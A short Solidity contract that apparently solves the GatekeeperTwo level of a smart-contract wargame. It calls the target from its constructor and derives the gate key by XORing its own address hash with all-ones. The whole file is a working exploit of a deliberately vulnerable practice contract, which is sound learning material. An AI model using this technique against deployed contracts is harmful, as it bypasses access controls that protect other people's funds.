// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import {GatekeeperTwo} from "./GatekeeperTwo.sol";

contract GatekeeperTwoHackDan {
    constructor(address _levelAddress) {
        GatekeeperTwo toHack = GatekeeperTwo(_levelAddress);

        // Either of the following work:
        // You just need the gateKey ^ bytes8(keccak256(abi.encodePacked(this)) to return 0xFFFFFFFFFFFFFFFF

        //bytes8 gateKey = ~(bytes8(keccak256(abi.encodePacked(this))));
        bytes8 gateKey = bytes8(keccak256(abi.encodePacked(this))) ^ 0xFFFFFFFFFFFFFFFF; 

        toHack.enter(gateKey);
    }
}